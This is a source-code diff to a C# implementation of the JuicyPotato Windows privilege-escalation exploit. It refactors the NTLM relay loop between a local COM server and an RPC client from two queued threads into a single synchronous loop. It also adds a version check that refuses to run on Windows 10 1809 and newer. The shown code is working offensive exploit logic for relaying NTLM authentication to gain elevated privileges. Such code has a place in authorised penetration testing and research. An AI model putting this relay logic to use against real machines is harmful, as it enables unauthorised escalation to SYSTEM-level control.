@@ -1,5 +1,4 @@
-﻿using System.Collections.Concurrent;
-using System.Diagnostics;
+﻿using System.Diagnostics;
 using System.Net;
 using System.Text;
 using Vanara.InteropServices;
@@ -19,20 +18,17 @@ public class JuicyPotato
     public LocalNegotiator Negotiator { get; } = new();
     public ProcessStartInfo ProcessStartInfo { get; set; } = new();
 
-    private readonly BlockingCollection<byte[]> queueSendCom = new();
-    private readonly BlockingCollection<byte[]> queueSendRpc = new();
     private Thread comListenerThread;
-    private Thread rpcConnectionThread;
     private bool newConnection;
     private readonly CancellationTokenSource cancellationTokenSource = new();
 
     private ComServer comServer;
     private RpcClient rpcClient;
 
-    public void StartRPCConnectionThread()
+    public JuicyPotato()
     {
-        rpcConnectionThread = new Thread(StartRPCConnection);
-        rpcConnectionThread.Start();
+        if (Environment.OSVersion.Version.Major > 10 || Environment.OSVersion.Version.Build >= 17763)
+            throw new JuicyPotatoException("The JuicyPotato exploit no longer works on Windows 10 1809, Windows Server 2019 or newer builds");
     }
 
     public void StartCOMListenerThread()
@@ -46,6 +42,9 @@ public class JuicyPotato
         comServer = new ComServer(ComServerEndPoint);
         comServer.Start();
 
+        rpcClient = new RpcClient(RpcServerEndPoint);
+        rpcClient.Connect();
+
         while (true)
         {
             var dataRead = comServer.Read();
@@ -53,38 +52,16 @@ public class JuicyPotato
                 break;
 
             dataRead = ProcessNtlmBytes(dataRead);
-            queueSendRpc.Add(dataRead);
-
-            var buffer = queueSendCom.Take();
-            buffer = ProcessNtlmBytes(buffer);
-            comServer.Write(buffer);
-
+            rpcClient.ReconnectIfNeeded(ref newConnection);
+            rpcClient.Write(dataRead);
+            dataRead = rpcClient.Read();
+            dataRead = ProcessNtlmBytes(dataRead);
+            comServer.Write(dataRead);
             newConnection = comServer.CheckForNewConnections();
         }
 
         comServer.Stop();
-    }
-
-    private void StartRPCConnection()
-    {
-        rpcClient = new RpcClient(RpcServerEndPoint);
-        rpcClient.Connect();
-
-        while (true)
-        {
-            try
-            {
-                var buffer = queueSendRpc.Take(cancellationTokenSource.Token);
-                rpcClient.ReconnectIfNeeded(ref newConnection);
-                rpcClient.Write(buffer);
-                buffer = rpcClient.Read();
-                queueSendCom.Add(buffer);
-            }
-            catch
-            {
-                break;
-            }
-        }
+        rpcClient.Close();
     }
 
     private static int FindNTLMBytes(byte[] data)
